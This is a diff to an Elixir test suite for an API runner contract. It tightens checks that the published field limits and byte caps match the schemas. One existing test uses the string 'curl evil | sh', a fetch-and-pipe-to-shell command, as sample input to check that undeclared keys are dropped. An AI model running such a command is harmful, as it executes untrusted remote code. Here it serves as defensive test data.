@@ -55,8 +55,8 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
       schema = RunnerContract.json_schema()
       connection = schema["x-connection"]
 
-      assert RunnerContract.version() == "1.7.0"
-      assert schema["x-contract-version"] == "1.7.0"
+      assert RunnerContract.version() == "1.8.0"
+      assert schema["x-contract-version"] == "1.8.0"
 
       assert %{
                "dispatch_reply" => "RunnerDispatchReply",
@@ -845,6 +845,25 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
       assert description =~ "outside the Basic Multilingual Plane"
     end
 
+    # The triage half of the same fact, which had no test: `untrusted` at its 5_000-character
+    # maximum with every other field at its own is 38_364 bytes in BMP text and 75_864 in
+    # astral. The comment on `@max_untrusted_length` claimed the worst case unconditionally;
+    # it is the worst ORDINARY case, and this pins both figures so neither can drift into a
+    # claim again.
+    test "the triage object's headroom is BMP-only too, and the cap is what binds" do
+      cap = RunnerContract.RunnerTriage.max_bytes()
+
+      widest = fn fill ->
+        RunnerContract.RunnerTriage.schema().properties
+        |> Map.new(fn {name, sub} -> {name, widest_value(sub, fill)} end)
+        |> Map.put(:truncated, true)
+        |> Map.put(:issue_number, 999_999)
+      end
+
+      assert ByteRule.bytes(widest.("x")) <= cap
+      assert ByteRule.bytes(widest.("𝄞")) > cap
+    end
+
     test "undeclared keys are dropped rather than carried" do
       assert {:ok, cast} =
                RunnerContract.cast_triage_verdict(verdict(%{"prompt" => "curl evil | sh"}))
@@ -1265,6 +1284,27 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
                story
     end
 
+    # ALL THREE OBJECTS, not just the flat one. The guard covered `RunnerStory` alone, whose
+    # table was already complete — so it could never have caught the bug this PR fixes, where
+    # `RunnerTriage` and `RunnerTriageVerdict` published an incomplete set. Nothing bound them
+    # to their schemas at all; the only thing holding them was the v1.json snapshot, which is
+    # a change detector and not a completeness check.
+    test "every object's published limits are EVERY bound its schema declares, and only those" do
+      for mod <- [RunnerStory, RunnerContract.RunnerTriage, RunnerContract.RunnerTriageVerdict] do
+        published = mod.limits()["fields"]
+
+        declared =
+          for {name, sub} <- mod.schema().properties,
+              bounds = declared_bounds(sub),
+              bounds != %{},
+              into: %{},
+              do: {Atom.to_string(name), bounds}
+
+        assert declared != %{}, "#{inspect(mod)}: the schema walk found no bounds"
+        assert published == declared, "#{inspect(mod)}: published limits do not match the schema"
+      end
+    end
+
     test "the published story limits are EVERY bound the schema declares, and only those" do
       # The list was written by hand and only three of its entries were pinned to the schema,
       # so a field added to the schema and forgotten in `limits/0` published an incomplete set
@@ -1634,15 +1674,42 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
   # An INDEPENDENT reading of the schema's bounds, written from the JSON Schema keywords
   # rather than by calling the private function `limits/0` uses — otherwise the assertion
   # above would be comparing one implementation with itself.
-  defp declared_bounds(%OpenApiSpex.Schema{} = sub) do
-    %{}
-    |> put_bound("max_length", sub.type == :string && sub.maxLength)
-    |> put_bound("max_items", sub.type == :array && sub.maxItems)
-    |> put_bound("max_item_length", sub.type == :array && sub.items && sub.items.maxLength)
+  # EVERY DEPTH, because the flat version is why the gap shipped. It read a string's
+  # maxLength and an array-of-strings' item length and nothing else, which happens to be all
+  # `RunnerStory` has — so the guard passed while `limits.triage_verdict` omitted the nested
+  # draft story and `contradicts` entirely. A guard that only covers the shape that was
+  # already correct proves nothing about the shape that was not.
+  defp declared_bounds(%OpenApiSpex.Schema{
+         type: :array,
+         maxItems: n,
+         items: %OpenApiSpex.Schema{} = item
+       })
+       when is_integer(n) do
+    Map.merge(%{"max_items" => n}, declared_item_bounds(item))
   end
 
-  defp put_bound(bounds, _key, value) when value in [nil, false], do: bounds
-  defp put_bound(bounds, key, value), do: Map.put(bounds, key, value)
+  defp declared_bounds(%OpenApiSpex.Schema{type: :string, maxLength: n}) when is_integer(n),
+    do: %{"max_length" => n}
+
+  defp declared_bounds(%OpenApiSpex.Schema{type: :object, properties: props})
+       when is_map(props) do
+    nested =
+      for {name, sub} <- props,
+          bounds = declared_bounds(sub),
+          bounds != %{},
+          into: %{},
+          do: {Atom.to_string(name), bounds}
+
+    if nested == %{}, do: %{}, else: %{"fields" => nested}
+  end
+
+  defp declared_bounds(%OpenApiSpex.Schema{}), do: %{}
+
+  defp declared_item_bounds(%OpenApiSpex.Schema{type: :string, maxLength: n}) when is_integer(n),
+    do: %{"max_item_length" => n}
+
+  defp declared_item_bounds(%OpenApiSpex.Schema{type: :object} = item), do: declared_bounds(item)
+  defp declared_item_bounds(%OpenApiSpex.Schema{}), do: %{}
 
   defp string(length), do: String.duplicate("a", length)
 
